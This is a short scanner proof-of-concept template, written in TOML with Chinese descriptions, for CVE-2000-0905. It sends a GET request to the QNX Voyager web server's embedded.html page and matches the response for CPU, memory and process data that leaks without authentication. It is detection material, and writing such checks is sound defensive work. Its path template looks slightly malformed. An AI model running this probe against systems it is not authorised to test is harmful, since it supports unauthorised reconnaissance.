[info]
author = "ave"
description = "通过访问 QNX Voyager Web Server 的 embedded.html 页面，检测是否存在未授权系统敏感信息泄露（CPU使用率、内存状态、进程列表等）"
id = "POC-AVE-2000-1005"
name = "QNX Voyager Webserver 敏感信息泄露漏洞 PoC"
severity = "medium"
tags = ["ave-2000-1005"]
vuln_id = [
    "CVE-2000-0905",
    "AVE-2000-1005",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/embedded.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "CPU",
    "Memory",
    "Process",
]
